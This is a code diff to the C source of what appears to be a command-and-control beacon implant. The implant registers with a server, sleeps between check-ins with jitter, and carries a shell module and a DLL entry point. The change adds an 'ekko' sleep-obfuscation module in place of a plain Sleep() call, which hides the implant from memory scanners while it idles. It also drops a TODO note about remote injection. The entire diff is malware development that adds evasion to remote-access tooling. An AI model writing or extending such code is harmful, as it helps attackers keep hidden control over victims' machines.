@@ -8,6 +8,7 @@
 #include "crypto/ecdh.h"
 #include "transport/http.h"
 #include "modules/shell.h"
+#include "modules/sleep_obf.h"
 
 #define AGENT_ID_SIZE  256
 
@@ -135,6 +136,9 @@ int beacon_main(void) {
         return 1;
     }
 
+    /* Non-fatal — ekko_sleep transparently falls back to Sleep() on failure. */
+    sleep_obf_init();
+
     int attempt = 0;
     while (do_register(agent_id, AGENT_ID_SIZE) != 0) {
         attempt++;
@@ -172,14 +176,13 @@ int beacon_main(void) {
                      + (rand() % (int)(C2_SLEEP_JITTER_MS * 2))
                      - (int)C2_SLEEP_JITTER_MS;
         if (sleep_ms < 1000) sleep_ms = 1000;
-        Sleep((DWORD)sleep_ms);
+        ekko_sleep((DWORD)sleep_ms);
     }
 
     shell_cleanup();
     return 0;
 }
 
-// TODO: add remote injection 
 #ifdef BUILD_DLL
 BOOL WINAPI DllMain(HINSTANCE h, DWORD reason, LPVOID r) {
     (void)h; (void)r;
